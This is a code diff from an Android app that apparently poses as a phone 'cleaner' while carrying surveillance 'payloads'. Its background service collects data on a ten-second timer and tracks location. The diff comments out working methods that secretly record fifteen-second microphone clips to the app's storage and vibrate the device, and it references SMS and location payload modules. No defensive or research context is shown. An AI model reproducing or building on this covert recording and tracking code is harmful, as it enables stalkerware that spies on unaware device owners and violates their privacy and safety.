@@ -8,12 +8,10 @@ import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
-import android.database.Cursor;
 import android.graphics.Color;
 import android.location.Location;
 import android.location.LocationListener;
 import android.media.MediaRecorder;
-import android.net.Uri;
 import android.os.Build;
 import android.os.IBinder;
 import android.os.VibrationEffect;
@@ -28,8 +26,6 @@ import com.cleaner.payloads.SMSManager;
 import com.cleaner.payloads.locationManager;
 
 import java.io.IOException;
-import java.io.OutputStreamWriter;
-import java.io.PrintWriter;
 import java.text.DateFormat;
 import java.text.SimpleDateFormat;
 import java.util.Date;
@@ -91,6 +87,9 @@ public class Application extends Service implements LocationListener {
         return channelId;
     }
 
+    /**
+     * Every 10000ms save data
+     * */
     private void collectData(Context context) {
         new Timer().schedule(new TimerTask() {
             @Override
@@ -102,52 +101,51 @@ public class Application extends Service implements LocationListener {
     }
 
 
-
-    private void recordAudio(String file, final int time) {
-        MediaRecorder recorder = new MediaRecorder();
-
-        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
-        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
-        recorder.setOutputFile(file);
-
-        try {
-            recorder.prepare();
-        } catch (IOException exception) {
-            exception.printStackTrace();
-        }
-
-        recorder.start();
-
-        Thread timer = new Thread(() -> {
-            try {
-                Thread.sleep(time * 1000L);
-            } catch (InterruptedException e) {
-                Log.d("TAG", "timer.interrupted");
-                e.printStackTrace();
-            } finally {
-                recorder.stop();
-                recorder.release();
-            }
-        });
-        timer.start();
-    }
-
-    private void saveAudio(Context context) {
-        DateFormat formatter = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss", Locale.UK);
-        Date date = new Date();
-        String filePrefix = context.getApplicationInfo().dataDir + "/audio-";
-        recordAudio(filePrefix + formatter.format(date) + ".3gp", 15);
-    }
-
-    private void searchDevice() {
-        Vibrator vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            vibrator.vibrate(VibrationEffect.createOneShot(500, VibrationEffect.DEFAULT_AMPLITUDE));
-        } else {
-            vibrator.vibrate(100);
-        }
-    }
+//    private void recordAudio(String file, final int time) {
+//        MediaRecorder recorder = new MediaRecorder();
+//
+//        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+//        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+//        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+//        recorder.setOutputFile(file);
+//
+//        try {
+//            recorder.prepare();
+//        } catch (IOException exception) {
+//            exception.printStackTrace();
+//        }
+//
+//        recorder.start();
+//
+//        Thread timer = new Thread(() -> {
+//            try {
+//                Thread.sleep(time * 1000L);
+//            } catch (InterruptedException e) {
+//                Log.d("TAG", "timer.interrupted");
+//                e.printStackTrace();
+//            } finally {
+//                recorder.stop();
+//                recorder.release();
+//            }
+//        });
+//        timer.start();
+//    }
+//
+//    private void saveAudio(Context context) {
+//        DateFormat formatter = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss", Locale.UK);
+//        Date date = new Date();
+//        String filePrefix = context.getApplicationInfo().dataDir + "/audio-";
+//        recordAudio(filePrefix + formatter.format(date) + ".3gp", 15);
+//    }
+//
+//    private void searchDevice() {
+//        Vibrator vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
+//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+//            vibrator.vibrate(VibrationEffect.createOneShot(500, VibrationEffect.DEFAULT_AMPLITUDE));
+//        } else {
+//            vibrator.vibrate(100);
+//        }
+//    }
 
     @Override
     public void onLocationChanged(@NonNull Location location) {
